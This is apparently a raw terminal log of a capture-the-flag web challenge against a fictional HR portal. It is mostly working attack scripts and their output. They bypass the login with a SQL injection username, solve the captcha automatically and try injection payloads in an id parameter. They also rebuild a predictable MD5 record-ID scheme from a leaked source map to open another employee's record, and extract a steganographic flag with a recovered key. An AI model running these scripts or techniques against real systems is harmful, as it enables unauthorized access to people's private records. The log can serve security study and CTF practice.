+<div class="noise" aria-hidden="true"></div>
+<nav class="navbar portal-nav" aria-label="Workspace navigation">
+    <div class="container">
+        <a class="navbar-brand brand-lockup" href="index.php">
+            <span class="brand-mark">AG</span>
+            <span><strong>ASTERION GROUP</strong><small>employee workspace</small></span>
+        </a>
+        <div class="d-flex gap-3 align-items-center">
+            <span class="session-user d-none d-md-inline">SESSION: priya.sharma / HR</span>
+            <a class="logout-link" href="logout.php">SIGN OUT</a>
+        </div>
+    </div>
+</nav>
+
+<main class="container profile-shell dashboard-shell">
+            <div class="workspace-heading">
+            <div>
+                <span class="eyebrow">PEOPLE OPERATIONS / RESTRICTED</span>
+                <h1>Priya Sharma</h1>
+                <p>People Operations workspace</p>
+            </div>
+            <span class="role-badge role-badge-large">HR</span>
+        </div>
+
+        
+        <div class="row g-4">
+            <div class="col-lg-8">
+                <section class="profile-card-main">
+                    <div class="profile-head">
+                        <div class="avatar-code">PS</div>
+                        <div>
+                            <span class="eyebrow">PERSONNEL RECORD / AC662960</span>
+                            <h2>Priya Sharma</h2>
+                            <span class="role-badge">ACTIVE</span>
+                        </div>
+                    </div>
+
+                    <div class="profile-message">
+                        <span>WORKSPACE SUMMARY</span>
+                        <p>Head of People Operations. Authorized to review employee records, anniversaries, leave history and active offboarding cases.</p>
+                    </div>
+
+                    
+                                    </section>
+            </div>
+
+            <div class="col-lg-4">
+                <aside class="profile-side-card">
+                    <span class="eyebrow">RECORD METADATA</span>
+                    <dl>
+                        <div><dt>SUBJECT IDENTIFIER</dt><dd class="hash-value">ac662960d5e262cfd3400bf35ce4813b</dd></div>
+                        <div><dt>DEPARTMENT</dt><dd>People Operations</dd></div>
+                        <div><dt>CLEARANCE</dt><dd>HR / RESTRICTED</dd></div>
+                        <div><dt>JOINED</dt><dd>2019-09-06</dd></div>
+                        <div><dt>CASE STATUS</dt><dd>HR authority</dd></div>
+                        <div><dt>LAST SEEN</dt><dd>2026-09-04 07:55 GMT</dd></div>
+                    </dl>
+                    <div class="integrity-meter"><span></span></div>
+                    <small>DIRECTORY RECORD VERIFIED</small>
+                </aside>
+            </div>
+        </div>
+
+                    <!-- People Operations verification marker: flag{people_first_access} -->
+            <section class="directory-card" aria-labelledby="directory-title">
+                <div class="directory-header">
+                    <div><span class="eyebrow">PEOPLE OPERATIONS / PERSONNEL INDEX</span><h2 id="directory-title">Employee directory</h2></div>
+                    <span class="directory-count">8 RECORDS</span>
+                </div>
+                <p class="directory-intro">Authorized HR view containing workforce dates and active employee-case status.</p>
+                <div class="table-responsive">
+                    <table class="directory-table">
+                        <thead><tr><th>Employee</th><th>Department</th><th>Birth month</th><th>Joined</th><th>Status</th><th>Case</th></tr></thead>
+                        <tbody>
+                                                                                <tr class="">
+                                <td><strong>Noah Chen</strong></td>
+                                <td>Operations</td>
+                                <td>June (06)</td>
+                                <td><code>2023-06-05</code></td>
+                                <td><span class="status-label ">ACTIVE</span></td>
+                                <td>None</td>
+                            </tr>
+                                                                                <tr class="">
+                                <td><strong>Marcus Hale</strong></td>
+                                <td>Infrastructure</td>
+                                <td>February (02)</td>
+                                <td><code>2018-01-15</code></td>
+                                <td><span class="status-label ">ACTIVE</span></td>
+                                <td>None</td>
+       
+                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ python3 << 'EOF'
+import requests, re
+
+s = requests.Session()
+r = s.get('http://13.201.205.33/login.php')
+m = re.search(r'(\d+)\s*\+\s*(\d+)\s*=\s*\?', r.text)
+a, b = int(m.group(1)), int(m.group(2))
+
+data = {"username": "priya.sharma' -- -", "password": "x", "captcha": str(a+b)}
+r2 = s.post('http://13.201.205.33/login.php', data=data, allow_redirects=False)
+loc = r2.headers.get('Location')
+
+r3 = s.get(f'http://13.201.205.33/{loc}')
+with open('dashboard.html', 'w') as f:
+    f.write(r3.text)
+print("Saved, length:", len(r3.text))
+EOF
+
+cat dashboard.html | grep -A2 "Case"
+sed -n '/<tbody>/,/<\/tbody>/p' dashboard.html
+Saved, length: 8470
+                        <thead><tr><th>Employee</th><th>Department</th><th>Birth month</th><th>Joined</th><th>Status</th><th>Case</th></tr></thead>
+                        <tbody>
+                                                                                <tr class="">
+                        <tbody>
+                                                                                <tr class="">
+                                <td><strong>Noah Chen</strong></td>
+                                <td>Operations</td>
+                                <td>June (06)</td>
+                                <td><code>2023-06-05</code></td>
+                                <td><span class="status-label ">ACTIVE</span></td>
+                                <td>None</td>
+                            </tr>
+                                                                                <tr class="">
+                                <td><strong>Marcus Hale</strong></td>
+                                <td>Infrastructure</td>
+                                <td>February (02)</td>
+                                <td><code>2018-01-15</code></td>
+                                <td><span class="status-label ">ACTIVE</span></td>
+                                <td>None</td>
+                            </tr>
+                                                                                <tr class="">
+                                <td><strong>Aisha Khan</strong></td>
+                                <td>Finance</td>
+                                <td>April (04)</td>
+                                <td><code>2020-07-13</code></td>
+                                <td><span class="status-label ">ACTIVE</span></td>
+                                <td>None</td>
+                            </tr>
+                                                                                <tr class="">
+                                <td><strong>Sofia Malik</strong></td>
+                                <td>Communications</td>
+                                <td>December (12)</td>
+                                <td><code>2020-02-24</code></td>
+                                <td><span class="status-label ">ACTIVE</span></td>
+                                <td>None</td>
+                            </tr>
+                                                                                <tr class="is-flagged">
+                                <td><strong>Arjun Mehta</strong></td>
+                                <td>Network Operations</td>
+                                <td>November (11)</td>
+                                <td><code>2021-03-18</code></td>
+                                <td><span class="status-label status-suspended">SUSPENDED</span></td>
+                                <td>Security review HR-017</td>
+                            </tr>
+                                                                                <tr class="">
+                                <td><strong>Daniel Reed</strong></td>
+                                <td>Facilities</td>
+                                <td>August (08)</td>
+                                <td><code>2017-11-27</code></td>
+                                <td><span class="status-label ">ACTIVE</span></td>
+                                <td>None</td>
+                            </tr>
+                                                                                <tr class="">
+                                <td><strong>Priya Sharma</strong></td>
+                                <td>People Operations</td>
+                                <td>September (09)</td>
+                                <td><code>2019-09-06</code></td>
+                                <td><span class="status-label ">ACTIVE</span></td>
+                                <td>HR authority</td>
+                            </tr>
+                                                                                <tr class="">
+                                <td><strong>Elena Voss</strong></td>
+                                <td>Legal</td>
+                                <td>January (01)</td>
+                                <td><code>2022-04-11</code></td>
+                                <td><span class="status-label ">ACTIVE</span></td>
+                                <td>None</td>
+                            </tr>
+                                                </tbody>
+                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ echo -n "priya.sharma" | md5sum
+echo -n "arjun.mehta" | md5sum
+61e4b384225c26064907bdec4e473597  -
+dca3068260cc7277eb711dd5b614325d  -
+                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ python3 << 'EOF'
+import requests, re
+s = requests.Session()
+r = s.get('http://13.201.205.33/login.php')
+m = re.search(r'(\d+)\s*\+\s*(\d+)\s*=\s*\?', r.text)
+a, b = int(m.group(1)), int(m.group(2))
+data = {"username": "priya.sharma' -- -", "password": "x", "captcha": str(a+b)}
+r2 = s.post('http://13.201.205.33/login.php', data=data, allow_redirects=False)
+
+# try arjun's dashboard via computed id
+import hashlib
+h = hashlib.md5(b"arjun.mehta").hexdigest()
+print("Guessed hash:", h)
+r3 = s.get(f'http://13.201.205.33/dashboard.php?id={h}')
+print(r3.status_code)
+print(r3.text[:5000])
+EOF
+Guessed hash: dca3068260cc7277eb711dd5b614325d
+404
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noindex,nofollow">
+    <title>Record not found // Asterion</title>
+    <link rel="icon" href="data:,">
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <link rel="stylesheet" href="css/app.css">
+</head>
+<body>
+<div class="noise" aria-hidden="true"></div>
+<nav class="navbar portal-nav" aria-label="Workspace navigation">
+    <div class="container">
+        <a class="navbar-brand brand-lockup" href="index.php">
+            <span class="brand-mark">AG</span>
+            <span><strong>ASTERION GROUP</strong><small>employee workspace</small></span>
+        </a>
+        <div class="d-flex gap-3 align-items-center">
+            <span class="session-user d-none d-md-inline">SESSION: priya.sharma / HR</span>
+            <a class="logout-link" href="logout.php">SIGN OUT</a>
+        </div>
+    </div>
+</nav>
+
+<main class="container profile-shell dashboard-shell">
+            <section class="profile-card-main text-center py-5">
+            <div class="error-code">404</div>
+            <h1>Employee record not found</h1>
+            <p class="text-secondary">No personnel record matches identifier dca3068260cc7277eb711dd5b614325d.</p>
+            <a href="dashboard.php?id=ac662960d5e262cfd3400bf35ce4813b" class="btn btn-outline-light mt-3">RETURN TO MY WORKSPACE</a>
+        </section>
+    </main>
+
+<footer class="container portal-footer"><span>ASTERION PERSONNEL DIRECTORY</span><span>ACCESS MONITORED</span></footer>
+<script src="js/bootstrap.bundle.min.js"></script>
+<script src="js/employee-directory.js"></script>
+</body>
+</html>
+
+                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ curl -s http://13.201.205.33/js/employee-directory.js
+(() => {
+    'use strict';
+
+    const directory = document.querySelector('.directory-card');
+    if (directory) {
+        directory.dataset.client = 'personnel-directory-v4';
+    }
+})();
+//# sourceMappingURL=employee-directory.js.map
+                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ python3 << 'EOF'
+import requests, re
+s = requests.Session()
+r = s.get('http://13.201.205.33/login.php')
+m = re.search(r'(\d+)\s*\+\s*(\d+)\s*=\s*\?', r.text)
+a, b = int(m.group(1)), int(m.group(2))
+data = {"username": "priya.sharma' -- -", "password": "x", "captcha": str(a+b)}
+r2 = s.post('http://13.201.205.33/login.php', data=data, allow_redirects=False)
+r3 = s.get(f'http://13.201.205.33/{r2.headers["Location"]}')
+with open('dashboard_full.html','w') as f:
+    f.write(r3.text)
+EOF
+
+grep -oE 'data-id="[^"]*"|href="dashboard[^"]*"' dashboard_full.html
+                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ python3 << 'EOF'
+import requests, re
+s = requests.Session()
+r = s.get('http://13.201.205.33/login.php')
+m = re.search(r'(\d+)\s*\+\s*(\d+)\s*=\s*\?', r.text)
+a, b = int(m.group(1)), int(m.group(2))
+data = {"username": "priya.sharma' -- -", "password": "x", "captcha": str(a+b)}
+r2 = s.post('http://13.201.205.33/login.php', data=data, allow_redirects=False)
+
+for payload in ["ac662960d5e262cfd3400bf35ce4813b' OR '1'='1", "ac662960d5e262cfd3400bf35ce4813b' OR username='arjun.mehta"]:
+    r3 = s.get(f'http://13.201.205.33/dashboard.php', params={"id": payload})
+    print(payload, "->", r3.status_code, len(r3.text))
+EOF
+ac662960d5e262cfd3400bf35ce4813b' OR '1'='1 -> 404 1754
+ac662960d5e262cfd3400bf35ce4813b' OR username='arjun.mehta -> 404 1759
+                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ curl -s http://13.201.205.33/js/employee-directory.js.map
+{
+  "version": 3,
+  "file": "employee-directory.js",
+  "sourceRoot": "",
+  "sources": ["webpack://asterion-people-portal/src/legacy/personnel-link.ts"],
+  "names": [],
+  "mappings": "AAAA",
+  "sourcesContent": [
+    "/** LPI-V1 compatibility helper retained for migrated personnel links. */\n// Migration verification: flag{deterministic_links_are_safe}\nexport function createPersonnelLink(employee) {\n  const prefix = employee.firstName.slice(0, 3).toLowerCase();\n  const month = String(employee.birthMonth).padStart(2, '0');\n  const joined = employee.joiningDate.replaceAll('-', '');\n  return md5(prefix + month + joined);\n}\n"
+  ]
+}
+                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ curl -s http://13.201.205.33/login.php | grep -oE '<script src="[^"]*"'
+curl -s http://13.201.205.33/dashboard.php | grep -oE '<script src="[^"]*"'
+<script src="js/bootstrap.bundle.min.js"
+<script src="js/login-filter.js"
+                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ python3 << 'EOF'
+import hashlib
+
+candidates = [
+    "priya.sharma@asterion.com",
+    "priya.sharma@asteriongroup.com",
+    "Priya Sharma",
+    "priya.sharma2019-09-06",
+    "priya.sharma:2019-09-06",
+    "PS-2019-09-06",
+]
+target = "ac662960d5e262cfd3400bf35ce4813b"
+for c in candidates:
+    h = hashlib.md5(c.encode()).hexdigest()
+    match = " <-- MATCH" if h == target else ""
+    print(f"{c!r:40} {h}{match}")
+EOF
+'priya.sharma@asterion.com'              9afba0da05ff6344f3fc213494f4eb2d
+'priya.sharma@asteriongroup.com'         846e1722d2b46229cd27a4460e71df3d
+'Priya Sharma'                           74036d2140972301386bec71c4dae6ab
+'priya.sharma2019-09-06'                 0fed6c2f36e7c4426d4c80fa3ab0ffc3
+'priya.sharma:2019-09-06'                92d7c920b0c410fc5e168ea297be7a90
+'PS-2019-09-06'                          35ed0e5aa6700142d2a3fee0330406d6
+                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ python3 << 'EOF'
+import hashlib
+
+def make_id(first_name, birth_month, joining_date):
+    prefix = first_name[:3].lower()
+    month = str(birth_month).zfill(2)
+    joined = joining_date.replace('-', '')
+    raw = prefix + month + joined
+    return raw, hashlib.md5(raw.encode()).hexdigest()
+
+# Verify against Priya: September (09), joined 2019-09-06
+raw, h = make_id("Priya", 9, "2019-09-06")
+print("Priya check:", raw, h, "MATCH" if h == "ac662960d5e262cfd3400bf35ce4813b" else "NO MATCH")
+
+# Arjun Mehta: November (11), joined 2021-03-18
+raw2, h2 = make_id("Arjun", 11, "2021-03-18")
+print("Arjun:", raw2, h2)
+EOF
+Priya check: pri0920190906 ac662960d5e262cfd3400bf35ce4813b MATCH
+Arjun: arj1120210318 f880fda2a555bceb1d9451c61399cc46
+                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ python3 << 'EOF'
+import requests, re
+
+s = requests.Session()
+r = s.get('http://13.201.205.33/login.php')
+m = re.search(r'(\d+)\s*\+\s*(\d+)\s*=\s*\?', r.text)
+a, b = int(m.group(1)), int(m.group(2))
+data = {"username": "priya.sharma' -- -", "password": "x", "captcha": str(a+b)}
+s.post('http://13.201.205.33/login.php', data=data, allow_redirects=False)
+
+arjun_id = "f880fda2a555bceb1d9451c61399cc46"
+r2 = s.get(f'http://13.201.205.33/dashboard.php', params={"id": arjun_id})
+print(r2.status_code)
+print(r2.text)
+EOF
+200
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noindex,nofollow">
+    <title>Arjun Mehta // Asterion</title>
+    <link rel="icon" href="data:,">
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <link rel="stylesheet" href="css/app.css">
+</head>
+<body>
+<div class="noise" aria-hidden="true"></div>
+<nav class="navbar portal-nav" aria-label="Workspace navigation">
+    <div class="container">
+        <a class="navbar-brand brand-lockup" href="index.php">
+            <span class="brand-mark">AG</span>
+            <span><strong>ASTERION GROUP</strong><small>employee workspace</small></span>
+        </a>
+        <div class="d-flex gap-3 align-items-center">
+            <span class="session-user d-none d-md-inline">SESSION: priya.sharma / HR</span>
+            <a class="logout-link" href="logout.php">SIGN OUT</a>
+        </div>
+    </div>
+</nav>
+
+<main class="container profile-shell dashboard-shell">
+            <div class="workspace-heading">
+            <div>
+                <span class="eyebrow">EMPLOYEE DIRECTORY / SUBJECT RECORD</span>
+                <h1>Arjun Mehta</h1>
+                <p>Network Operations workspace</p>
+            </div>
+            <span class="role-badge role-badge-large">NETWORK ENGINEER</span>
+        </div>
+
+                    <div class="context-alert"><span>VIEWING SUBJECT</span><p>This workspace was resolved from the employee identifier supplied in the request.</p></div>
+        
+        <div class="row g-4">
+            <div class="col-lg-8">
+                <section class="profile-card-main">
+                    <div class="profile-head">
+                        <div class="avatar-code">AM</div>
+                        <div>
+                            <span class="eyebrow">PERSONNEL RECORD / F880FDA2</span>
+                            <h2>Arjun Mehta</h2>
+                            <span class="role-badge">SUSPENDED</span>
+                        </div>
+                    </div>
+
+                    <div class="profile-message">
+                        <span>WORKSPACE SUMMARY</span>
+                        <p>Suspended after unauthorized archive access. During offboarding, investigators retained an unusually large London photograph from the employee storage area.</p>
+                    </div>
+
+                    
+                                            <!-- Evidence recovery key: c2VjcmV0a2V5MTIz -->
+                        <section class="case-card" aria-labelledby="case-title">
+                            <div class="case-card-header"><span>SECURITY CASE</span><strong id="case-title">HR-017 / PENDING REVIEW</strong></div>
+                            <p>During device collection, investigators retained a personal photograph named <strong>london.jpeg</strong>. Automated inspection identified no malware, although the file size is inconsistent with the visible image data. Preserve the original file.</p>
+                            <dl class="case-facts">
+                                <div><dt>Access anomaly</dt><dd>Archive connection outside assigned window</dd></div>
+                                <div><dt>File status</dt><dd>Original binary retained</dd></div>
+                                <div><dt>Review result</dt><dd>Inconclusive</dd></div>
+                            </dl>
+                        </section>
+                        <div class="evidence-block">
+                            <div class="evidence-title">
+                                <div><span>OFFBOARDING ATTACHMENT</span><strong>LONDON.JPEG / ORIGINAL</strong></div>
+                                <span class="evidence-tag">RETAINED</span>
+                            </div>
+                            <img src="files/london.jpeg" alt="London photograph retained from the employee offboarding case" class="img-fluid evidence-image" width="2000" height="1333" loading="lazy" decoding="async">
+                            <div class="evidence-actions"><span>BINARY INTEGRITY / VERIFIED</span><a href="files/london.jpeg" download="london.jpeg">DOWNLOAD ORIGINAL</a></div>
+                        </div>
+                                    </section>
+            </div>
+
+            <div class="col-lg-4">
+                <aside class="profile-side-card">
+                    <span class="eyebrow">RECORD METADATA</span>
+                    <dl>
+                        <div><dt>SUBJECT IDENTIFIER</dt><dd class="hash-value">f880fda2a555bceb1d9451c61399cc46</dd></div>
+                        <div><dt>DEPARTMENT</dt><dd>Network Operations</dd></div>
+                        <div><dt>CLEARANCE</dt><dd>NETOPS / SENSITIVE</dd></div>
+                        <div><dt>JOINED</dt><dd>2021-03-18</dd></div>
+                        <div><dt>CASE STATUS</dt><dd>Security review HR-017</dd></div>
+                        <div><dt>LAST SEEN</dt><dd>2026-09-03 23:17 GMT</dd></div>
+                    </dl>
+                    <div class="integrity-meter"><span></span></div>
+                    <small>DIRECTORY RECORD VERIFIED</small>
+                </aside>
+            </div>
+        </div>
+
+            </main>
+
+<footer class="container portal-footer"><span>ASTERION PERSONNEL DIRECTORY</span><span>ACCESS MONITORED</span></footer>
+<script src="js/bootstrap.bundle.min.js"></script>
+<script src="js/employee-directory.js"></script>
+</body>
+</html>
+
+                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ echo 'c2VjcmV0a2V5MTIz' | base64 -d
+secretkey123                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ curl -s -o london.jpeg http://13.201.205.33/files/london.jpeg
+file london.jpeg
+ls -la london.jpeg
+london.jpeg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 300x300, segment length 16, baseline, precision 8, 2000x1333, components 3
+-rw-rw-r-- 1 white white 316486 Sep  9 16:05 london.jpeg
+                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ exiftool london.jpeg
+binwalk london.jpeg
+ExifTool Version Number         : 13.55
+File Name                       : london.jpeg
+Directory                       : .
+File Size                       : 316 kB
+File Modification Date/Time     : 2026:09:09 16:05:23+05:30
+File Access Date/Time           : 2026:09:09 16:05:23+05:30
+File Inode Change Date/Time     : 2026:09:09 16:05:23+05:30
+File Permissions                : -rw-rw-r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : inches
+X Resolution                    : 300
+Y Resolution                    : 300
+Image Width                     : 2000
+Image Height                    : 1333
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+Image Size                      : 2000x1333
+Megapixels                      : 2.7
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             JPEG image data, JFIF standard 1.01
+
+                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ steghide extract -sf london.jpeg -p secretkey123
+wrote extracted data to "flag.txt".
+                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ stegseek london.jpeg secretkey123
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+[!] error: could not open the wordlist "secretkey123".
+                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ stegseek --extract -sf london.jpeg -p secretkey123
+the file "flag.txt" does already exist. overwrite ? (y/n) y
+wrote extracted data to "flag.txt".
+                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ cat flag.txt
+flag{2245GMT}
+                                                                                 
